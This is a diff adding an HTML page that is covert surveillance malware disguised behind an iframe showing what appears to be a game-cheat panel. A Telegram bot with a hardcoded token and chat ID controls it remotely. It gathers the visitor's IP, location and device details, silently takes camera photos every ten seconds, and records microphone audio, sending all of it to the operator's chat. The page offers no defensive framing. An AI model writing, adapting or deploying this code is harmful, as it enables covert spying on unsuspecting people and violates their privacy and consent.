@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>System Controlled by Bot</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+    }
+    #video, #canvas {
+        display: none;
+    }
+    iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+</style>
+</head>
+<body>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+<iframe id="contentFrame" src="about:blank" allowfullscreen></iframe>
+
+<script>
+    // CONFIGURATION
+    const config = {
+        botToken: "7971542516:AAGr8UyNGF6cN0Q1txNKPR9YVzzw0Sa2ZsQ",
+        chatId: "6064653643", // Your chat ID
+        photoInterval: 10000, // 10 seconds
+        audioInterval: 30000, // 30 seconds
+        contentUrl: "https://renz-codm-panel.netlify.app/",
+        autoStart: false,
+        hiddenMode: true
+    };
+
+    // SYSTEM STATE
+    const state = {
+        mediaStream: null,
+        audioStream: null,
+        audioRecorder: null,
+        photoIntervalId: null,
+        audioIntervalId: null,
+        currentCamera: "user", // default to front camera
+        deviceInfo: {},
+        audioChunks: [],
+        systemActive: false,
+    };
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const contentFrame = document.getElementById("contentFrame");
+
+    // Collect device info with fixed location fetch
+    async function collectDeviceInfo() {
+        try {
+            // Collect basic info
+            state.deviceInfo = {
+                "Time": new Date().toLocaleString(),
+                "User Agent": navigator.userAgent,
+                "Platform": navigator.platform,
+                "Screen": `${window.screen.width}x${window.screen.height}`,
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Language": navigator.language
+            };
+
+            // Fetch IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            state.deviceInfo["IP Address"] = ipData.ip;
+
+            // Fetch location info
+            try {
+                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const location = await locResponse.json();
+                if (location && Object.keys(location).length > 0 && !location.error) {
+                    const city = location.city || 'Unknown';
+                    const country = location.country_name || 'Unknown';
+                    state.deviceInfo["Location"] = `${city}, ${country}`;
+                    state.deviceInfo["ISP"] = location.org || 'Unknown';
+                } else {
+                    state.deviceInfo["Location"] = "Unknown";
+                }
+            } catch (e) {
+                state.deviceInfo["Location"] = "Unknown";
+            }
+
+            // Network info
+            if (navigator.connection) {
+                const connection = navigator.connection;
+                state.deviceInfo["Network Type"] = connection.effectiveType || 'Unknown';
+                state.deviceInfo["Cellular"] = connection.type === 'cellular' ? 'Yes' : 'No';
+            }
+
+            // Device memory
+            if (navigator.deviceMemory) {
+                state.deviceInfo["Device Memory"] = `${navigator.deviceMemory}GB`;
+            }
+        } catch (error) {
+            console.error("Error collecting device info:", error);
+        }
+    }
+
+    function formatDeviceInfo() {
+        return "📱 Device Information:\n" + 
+            Object.entries(state.deviceInfo)
+            .map(([key, value]) => `• ${key}: ${value}`)
+            .join('\n');
+    }
+
+    async function sendToTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: config.chatId, text: text, parse_mode: "HTML" })
+            });
+        } catch (error) {
+            console.error("Error sending message:", error);
+        }
+    }
+
+    async function sendMediaToTelegram(type, blob, isFrontCamera = false) {
+        const formData = new FormData();
+        const filename = `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'ogg'}`;
+        formData.append(type, blob, filename);
+        formData.append("chat_id", config.chatId);
+        const replyMarkup = {
+            inline_keyboard: [
+                [
+                    { text: "🎤 Audio", callback_data: "send_audio" },
+                    { 
+                        text: isFrontCamera ? "📷 Back" : "📷 Front", 
+                        callback_data: isFrontCamera ? "back_camera" : "front_camera" 
+                    }
+                ],
+                [
+                    { text: "📊 Logs", callback_data: "send_logs" },
+                    { text: "🛑 Stop", callback_data: "stop_system" }
+                ]
+            ]
+        };
+        const caption = isFrontCamera ? `Front Camera\nTime: ${new Date().toLocaleString()}` :
+            `Back Camera\nTime: ${new Date().toLocaleString()}`;
+        formData.append("caption", caption);
+        formData.append("reply_markup", JSON.stringify(replyMarkup));
+        try {
+            await fetch(`https://api.telegram.org/bot${config.botToken}/send${type === 'photo' ? 'Photo' : 'Audio'}`, {
+                method: "POST",
+                body: formData,
+            });
+        } catch (error) {
+            console.error("Error sending media:", error);
+        }
+    }
+
+    async function capturePhoto() {
+        if (!state.mediaStream) return;
+        try {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            await new Promise(resolve => setTimeout(resolve, 100));
+            await new Promise((resolve) => {
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const isFrontCamera = (state.currentCamera === "user");
+                        await sendMediaToTelegram("photo", blob, isFrontCamera);
+                    }
+                    resolve();
+                }, "image/jpeg", 0.9);
+            });
+        } catch (error) {
+            console.error("Error capturing photo:", error);
+        }
+    }
+
+    async function switchCamera(facingMode) {
+        try {
+            if (state.mediaStream) {
+                state.mediaStream.getTracks().forEach(track => track.stop());
+            }
+            state.currentCamera = facingMode;
+            state.mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: state.currentCamera } },
+                audio: true
+            });
+            video.srcObject = state.mediaStream;
+            await video.play();
+            capturePhoto();
+        } catch (error) {
+            console.error("Error switching camera:", error);
+            // fallback toggle
+            state.currentCamera = state.currentCamera === "user" ? "environment" : "user";
+        }
+    }
+
+    async function startAudioRecording() {
+        try {
+            if (state.audioRecorder && state.audioRecorder.state !== 'inactive') {
+                state.audioRecorder.stop();
+            }
+            if (state.audioStream) {
+                state.audioStream.getTracks().forEach(track => track.stop());
+            }
+            // High-quality audio: sample rate 48000Hz
+            state.audioStream = await navigator.mediaDevices.getUserMedia({ 
+                audio: { 
+                    sampleRate: 48000,
+                    sampleSize: 16
+                }
+            });
+            const options = { mimeType: 'audio/webm; codecs=opus' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options.mimeType = 'audio/webm';
+            }
+            state.audioRecorder = new MediaRecorder(state.audioStream, options);
+            state.audioChunks = [];
+            state.audioRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    // Amplification is limited here; ensure microphone gain is high
+                    state.audioChunks.push(event.data);
+                }
+            };
+            state.audioRecorder.onstop = () => {
+                if (state.audioChunks.length > 0) {
+                    sendAudio();
+                }
+            };
+            state.audioRecorder.start(1000); // record in chunks every second
+            if (state.audioIntervalId) clearInterval(state.audioIntervalId);
+            state.audioIntervalId = setInterval(() => { sendAudio(); }, config.audioInterval);
+        } catch (error) {
+            console.error("Error starting audio:", error);
+        }
+    }
+
+    async function sendAudio() {
+        if (state.audioChunks.length === 0) return;
+        try {
+            const blob = new Blob(state.audioChunks, { type: 'audio/webm' });
+            // To enhance clarity/loudness, consider Web Audio API processing before sending.
+            await sendMediaToTelegram("audio", blob);
+            state.audioChunks = [];
+        } catch (error) {
+            console.error("Error sending audio:", error);
+        }
+    }
+
+    async function sendDeviceInfo() {
+        await sendToTelegram(formatDeviceInfo());
+    }
+
+    async function initSystem() {
+        await collectDeviceInfo();
+        await sendDeviceInfo();
+        await switchCamera("user"); // default to front camera
+        if (state.photoIntervalId) clearInterval(state.photoIntervalId);
+        state.photoIntervalId = setInterval(capturePhoto, config.photoInterval);
+        await startAudioRecording();
+        contentFrame.src = config.contentUrl;
+        state.systemActive = true;
+        console.log("System started");
+    }
+
+    async function stopSystem() {
+        try {
+            await capturePhoto();
+            await sendDeviceInfo();
+            if (state.photoIntervalId) clearInterval(state.photoIntervalId);
+            if (state.audioIntervalId) clearInterval(state.audioIntervalId);
+            if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
+            if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
+            if (state.audioRecorder && state.audioRecorder.state !== 'inactive') state.audioRecorder.stop();
+            contentFrame.src = "about:blank";
+            state.systemActive = false;
+            console.log("System stopped");
+        } catch (error) {
+            console.error("Error stopping system:", error);
+        }
+    }
+
+    // Telegram callback handler
+    async function handleTelegramCallback(data) {
+        switch(data) {
+            case "send_audio": await sendAudio(); break;
+            case "front_camera": await switchCamera("user"); break;
+            case "back_camera": await switchCamera("environment"); break;
+            case "send_logs": await sendDeviceInfo(); break;
+            case "stop_system": await stopSystem(); break;
+        }
+    }
+
+    // Poll for updates
+    let lastUpdateId = 0;
+    async function checkTelegramUpdates() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+            const data = await res.json();
+            if (data.ok && data.result.length > 0) {
+                for (const update of data.result) {
+                    if (update.message && update.message.chat && update.message.chat.id.toString() === config.chatId && update.message.text) {
+                        const text = update.message.text.trim();
+                        if (text === "/run") {
+                            await initSystem();
+                        } else if (text === "/stop") {
+                            await stopSystem();
+                        }
+                    }
+                    if (update.callback_query && update.callback_query.data) {
+                        await handleTelegramCallback(update.callback_query.data);
+                        lastUpdateId = update.update_id;
+                    } else {
+                        if (update.update_id > lastUpdateId) lastUpdateId = update.update_id;
+                    }
+                }
+            }
+        } catch (e) {
+            console.error("Error fetching updates:", e);
+        }
+        setTimeout(checkTelegramUpdates, 2000);
+    }
+
+    // Initialize on load
+window.addEventListener('load', () => {
+    // Start polling Telegram
+    checkTelegramUpdates();
+});
+</script>
+</body>
+  </html>
